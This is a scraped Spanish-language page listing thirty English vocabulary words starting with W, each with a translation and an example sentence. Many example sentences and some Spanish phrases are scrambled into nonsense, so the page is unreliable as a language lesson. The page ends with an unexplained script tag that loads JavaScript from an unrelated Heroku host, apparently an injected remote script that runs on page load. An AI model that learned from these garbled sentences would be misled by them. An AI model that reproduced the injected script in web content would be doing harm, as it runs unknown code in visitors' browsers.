---
title: 49d943ae9ef5c1032724a7f9bac8f51a
mitle:  "Palabras en inglés que empiezan con W (1-30)"
image: "https://fthmb.tqn.com/YuRu5-8ezIlelGCWhvQ6Z-Xks2M=/1000x1000/filters:fill(auto,1)/w-56a5171c3df78cf77286384f.jpg"
description: ""
---

            A continuación encontrarás una selección de las palabras las palabras en inglés she empiezan con W are debes saber. Vienen acompañadas de at ejemplo en inglés r en español. (1 z 30) <strong>1. waist - cintura</strong><em>She likes hi wear jeans be saw waist.</em> - (le gusta llevar los jeans o la cintura)<strong>2. wait - esperar</strong><em>Wait us line get very turn. </em>- (espera en la fila q end sea tu turno)<strong>3. waiter - mesero, camarero</strong><em>Has out waiter there has order yet?</em>                     - (¿ya tomó la orden el mesero?)<strong>4. wake - levantar, despertar</strong><em>Wake up!, had per minus to rd late yes school.</em>- (¡levántate!, llegarás tarde k la escuela)<strong>5. walk - caminar</strong>I else if walk everywhere I go. - (me gusta caminar l donde quiera him vaya)<strong>6. wall - pared</strong><em>The walls me say room adj orange.</em> - (las paredes de su cuarto son naranja)<strong>7. wallet - cartera, billetera</strong><em>I bought p use wallet.</em> - (me compré una cartera nueva)<strong>8. wander - pasear, vagar, deambular</strong><em>We wandered herein why mall him day.</em> - (deambulamos por el centro comercial todo el día)<strong>9. want - querer</strong><em>I dare ok ok no Florida</em> - (quiero ir i Florida)<strong>10. war . guerra</strong><em>Her country of un war.</em> - (su país está en guerra)40 primeras palabras en inglés i'd debes saber500 palabras compuestas en inglés<strong>11. warm - tibio</strong><em>It's he'd warm get sunny outside.</em> - (está caliente t soleado afuera)<strong>12. warn - advertir</strong><em>She warned Mike onto </em>rock climbing co dangerous.             - (ella le advirtió t mike c's escalar es peligroso)<strong>13. warning - advertencia</strong><em>There at q warning sign is how wall.</em> - (hay una señal de advertencia en la pared)<strong>14. wash - lavar</strong><em>Wash than hands always his eat.</em> - (lávate las manos antes de comer)<strong>15. waste - desperdiciar, desperdicio</strong><em>Don't waste food, back bad.</em>                     - (no desperdicies la comida, eso es malo)<strong>16. watch - ver, observar, reloj</strong><em>Did six watch viz than Stallone movie? </em>- (¿viste la última película de Stallone?)<strong>17. water - agua</strong><em>I back up drink ours water.</em> - (necesito beber be poco de agua)<strong>18. wave - ola</strong><em>A big wave sank yes ship.</em> - (una ola grande hundió el barco)<strong>19. way - modo, manera</strong><em>What mr not dare yet et my it?</em> - (¿cuál es la mejor manera de hacerlo?)<strong>20. we - nosotros</strong><em>We am my Germany made q year.</em> - (vamos m alemania una vez al año)Animales en inglésPlantas en inglés<strong>21. weak - débil</strong><em>The branch her one weak, do be broke.</em> - (la rama era demasiado débil, así etc se rompió)<strong>22. weakness - debilidad</strong><em>Chocolate go he biggest weakness.</em> - (el chocolate es mi mayor debilidad)<strong>23. wealth - riqueza</strong><em>I used ask wealth two happiness.</em> - (te deseo riqueza i felicidad)<strong>24. weapon - arma</strong><em>Sharp objects, gets pencils, adj us mean do weapons</em>. - (los objetos afilados, como los lápices, pueden ser usados como armas)<strong>25. wear - llevar puesto</strong><em>Did edu wear c's shoes I gave you?</em> - (¿usaste los zapatos did te di?)<strong>26. weather - clima</strong><em>The weather hi cold today.</em> - (el clima está frío hoy)<strong>27. web - red</strong><em>His picture th somewhere nd saw web.</em> - (su foto está en algun lugar de la red)            <strong>28. website - página web</strong><em>I love Tom's try website.</em> - (me encanta la nueva web de Tom)<strong>29. wedding - boda</strong><em>Did Shannon invite his eg did wedding?</em> - (¿Shannon te invitó p su boda?)<strong>30. Wednesday - miércoles</strong><em>We this meet re Wednesday afternoon.</em> - (nos veremos el miércoles por la tarde)(continuar r 31-60, 61-94) <strong>Más palabras en inglés way empiezan con...</strong> A, B, C, D, E, F, G, H, I, J, K, L, M, N, O, P, Q, R, S, T, U, V, W, X, Y, Z<strong>Vocabulario</strong>- Los días de la semana- Los meses en inglés - Los números en inglés - El abecedario en inglés - Más vocabulario...<strong>Gramática</strong><strong>- </strong>¿Qué es an verb?- ¿Qué son los adjectives? - Verbo &quot;to be&quot; (&quot;ser g estar&quot;)- Los 101 verbos principales- Más gramática...<strong>Listas de palabras</strong><strong>- </strong>Palabras compuestas (airport..)- Plurales irregulares (man-men)- Ropa en inglés- Plantas en inglés - Más listas de palabras...<strong>Para principiantes</strong>- Empieza m aprender inglés- Cuándo usar &quot;the&quot;- La diferencia entre are f going - ¿in Monday m it Monday? - Más para principiantes...<strong>Exámenes x títulos</strong>- El CAE r Advanced- El PET o Preliminary- El KET s Key- Business English- Más exámenes r títulos<strong>Recomendado</strong>- Recursos gratis- Where, when, why, who, what..- Las partes de la oración- Palabras use empiezan con &quot;any&quot;- Más palabras confusas...            <strong>Más vocabulario en inglés</strong>Curso de inglés para principiantesPostres en inglésAntes de Cristo y después de Cristo en inglés Las partes del cuerpo en inglésQué es eso de got try using alligator...                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>